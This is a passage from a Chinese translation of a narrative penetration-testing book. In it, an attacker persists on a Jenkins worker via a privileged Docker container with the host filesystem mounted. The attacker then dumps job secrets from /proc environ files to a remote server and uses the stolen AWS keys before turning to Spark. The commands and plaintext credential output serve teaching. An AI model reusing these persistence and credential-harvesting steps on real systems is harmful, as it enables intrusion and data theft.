
容器注册表（ECR）。我们知道账户 ID 为 983457354409；在 mxrads-dl 的存储桶策略中我们看到了它的授权。我们的猜测是对的：果然是 Gretsch Politico。

在清单 12-2 中找到的所有容器都使用 master 标签拉取了，除了一个：app-abtest 镜像，它带有奇怪的标签 SUP6541-add-feature-network。

我们可能对这台机器上发生的事情有所了解，但在得出结论之前我们仍需要最后一条信息。让我们使用 docker info 命令获取更多信息，以显示有关主机的信息：

```
# docker info
Name: jenkins-slave-4
Total Memory: 31.859GiB
Operating System: Ubuntu 16.04.6 LTS
Server:
Containers: 546
Running: 12
--snip--
```

你好，Jenkins，我们的老朋友。现在一切都说得通了。我们可以猜测，我们的 payload 是由我们假设的端到端测试工作负载触发的。此实例中触发的作业可能启动一个容器，该容器使用 ecr-login.sh 脚本对 AWS ECR 进行身份验证，然后拉取由 master 标签指示的生产容器子集——datavalley、libpredict 以及其他容器——以及待测试服务的实验性 Docker 镜像：ab-test。这就解释了为什么它的标签与其他所有容器不同。

以这种方式暴露 Docker socket 是测试环境中的常见做法，在那里 Docker 并非主要用于其隔离特性，而是用于其打包功能。例如，Crane，一种流行的 Docker 编排工具（https://github.com/michaelsauter/crane/），用于连同其依赖项一起拉取容器。相反，公司可能会将 Crane 打包在容器中，并在需要时在运行时拉取它。

从软件角度来看，这很棒。所有作业都使用相同版本的 Crane 工具，而运行测试的服务器变得无关紧要。然而，从安全角度来看，这合法化了 Docker-in-Docker 技巧的使用（Crane 在其自己的容器内运行容器），这打开了地狱之门，甚至更糟。

## 保持访问

测试作业只能持续一段时间就会被丢弃。让我们通过在我们标记为 aws-cli 的新容器上运行自定义 meterpreter，将这种临时访问转变为永久访问：

```
# docker run \
--privileged \
-v /:/hostOS \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /usr/bin/docker:/usr/bin/docker \
-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli
```

我们的新反向 shell 运行在一个特权容器中，该容器挂载了 Docker socket 以及整个主机文件系统到 /hostOS 目录中：

```
meterpreter > ls /hostOS
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt
opt  proc  root  run...
```

开始吧！
正如我们在第 10 章中所看到的，由于其调度能力，Jenkins 可以迅速聚合大量权限。它是技术世界的雷曼兄弟——一个在不受监管的领域中饥饿的实体，受鲁莽的政策制定者鼓励，只差一笔交易就会导致整个经济崩溃。

在此特定情况下，这个比喻性的交易就是 Jenkins 处理环境变量的方式。当作业在 worker 上调度时，可以配置为仅拉取运行所需的一两个秘密，也可以将所有可能的秘密作为环境变量加载。让我们看看 Gretsch Politico 的管理员到底有多懒。

我们筛选出这台机器上由 Jenkins 作业启动的每个进程：

```
shell> ps -ed -o user,pid,cmd | grep "jenkins"
jenkins   1012   /lib/systemd/systemd -user
jenkins   1013   sshd: jenkins@notty
jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...
jenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/... 
--snip--
```

我们将这些进程的 PID 复制到一个文件中，并逐行迭代以获取其环境变量，这些变量方便地存储在路径 /proc/$PID/environ 下：

```
shell> ps -ed -o user,pid,cmd \
| grep "jenkins" \
| awk '{print $2}' \
> listpids.txt
shell> while read p; do \
cat /hostOS/proc/$p/environ >> results.txt; \
done <listpids.txt
```

我们将收获上传到我们的远程服务器并进行一些轻微格式化，然后我们就可以欣赏明文结果（见清单 12-3）。

```
root@Point1:~/# cat results.txt
ghprbPullId = 1068
SANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox
DBEXP_PROD_USER = pg_sql_exp
DBEXP_PROD_PASS = vDoMue8%12N97
METAMARKET_TOKEN = 1#4Xq3_rwn14gJKmkynOHho8p6peSZ2UGIvs...
DASHBOARD_PROD_PASSWORD = 4hXqulCghprbIU24745
SPARK_MASTER = 10.50.12.67
ActualCommitAuthorEmail = Elain.ghaber@gretschpolitico.com
BINTRAY_API_KEY = 557d459a1e9ac79a1da57$fbee88acdeacsq7S
GITHUB_API = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561
ECR_AWS_ID = AKIA7ZRK7X1QSZR4H2P
ECR_AWS_SECRET = ZO5cOTQQ/5zNoEkRE99pdlInY6anhgz2s30GJ+zgb
--snip--
```

### 清单 12-3：从 Jenkins 机器上运行的作业收集环境变量的结果

精彩。我们获得了一个 GitHub API 令牌来探索 GP 的整个代码库，一些数据库密码来收集数据，以及显然的 AWS 访问密钥，这些密钥至少应该可以访问 ECR（AWS 容器注册表）或如果我们幸运的话甚至 EC2。

我们将它们加载到我们的服务器上并盲目地开始探索 AWS 服务：

```
root@Point1:~/# aws ecr describe-repositories \
--region=eu-west-1 \
--profile gretsch1

"repositoryName": "lib-prediction",
"repositoryName": "service-geoloc",
"repositoryName": "cookie-matching",
--snip--

root@Point1:~/# aws ec2 describe-instances --profile gretsch1
An error occurred (UnauthorizedOperation)...

root@Point1:~/# aws s3api list-buckets --profile gretsch1
An error occurred (UnauthorizedOperation)...

root@Point1:~/# aws iam get-user --profile gretsch1
An error occurred (AccessDenied)...
```

我们一旦超出 ECR 范围就会遇到多个错误。在另一个时间、另一个环境中，我们会摆弄容器镜像、搜索硬编码凭据，或篡改生产标签以实现机器上的代码执行——但有一条更 promising 的线索。它被埋在我们从清单 12-3 倾倒的环境数据中，所以让我再次放大它：

```
SPARK_MASTER = 10.50.12.67
```

这里的 SPARK 指的是 Apache Spark，一个开源分析引擎。只关注这个孤零零的 IP 地址而放过 ECR 访问密钥和数据库凭据似乎令人惊讶，但请记住我们最初的目标之一：获取用户资料和数据段。这类数据不会存储在普通的 100GB 数据库中。当充分丰富了每个人的所有可用信息时，并且考虑到 MXR Ads 平台的规模，这些数据资料很容易达到数百甚至数千 TB。

当公司处理如此荒谬的容量时，通常会出现两个问题。他们在哪里存储原始数据？以及如何高效地处理它？

存储原始数据很容易。S3 价格便宜且可靠，这是不言而喻的。然而，处理海量数据则是一个真正的挑战。数据科学家希望以合理的成本建模和预测行为，需要一个分布式系统来处理负载——比如 500 台机器并行工作，每台机器训练多个具有随机超参数的模型，直到找到误差率最低的公式。

但这又引发了额外的问题。他们如何高效地在节点之间划分数据？如果所有机器都需要同一块数据怎么办？他们如何汇总所有结果？最重要的是：他们如何处理故障？因为肯定会发生故障。每 1,000 台机器平均有 5 台，甚至更多，会因各种原因死亡，包括磁盘问题、过热、停电和其他危险事件，即使在顶级数据中心也是如此。他们如何将失败的工作负载重新分配到更健康的节点上？

正是这些问题，Apache Spark 旨在通过其分布式计算框架来解决。如果 Spark 涉及 Gretsch Politico，那么它很可能被用来处理大量数据，这些数据很可能就是我们想要的用户资料——因此我们对在 Jenkins 机器上获取的 IP 地址感兴趣。

入侵 Spark 集群将自动使我们能够访问原始资料数据，了解它经历了什么样的处理，并理解 Gretsch Politico 如何利用这些数据。

然而，截至目前，还没有任何一篇黑客文章可以帮助我们攻破 Spark 集群（同样的观察也可以适用于几乎所有大数据工具：Yarn、Flink、Hadoop、Hive 等）。甚至没有一个 Nmap 脚本来指纹识别这该死的玩意。我们正在未知的海域航行，所以最自然的步骤是首先了解如何与 Spark 集群交互。

## 了解 Spark

Spark 集群本质上由三个主要组件组成：主服务器、worker 机器和 driver。driver 是希望执行计算的客户端；例如分析师的笔记本电脑。主服务器的唯一工作是管理 worker 并根据内存和 CPU 需求分配作业。worker 执行主服务器发送给它们的任何作业。它们与主服务器和 driver 通信。

这三个组件中的每一个都在 Java 虚拟机（JVM）内部运行一个 Spark 进程，甚至分析师的笔记本电脑（driver）也是如此。不过关键在于：Spark 默认情况下是关闭安全性的。
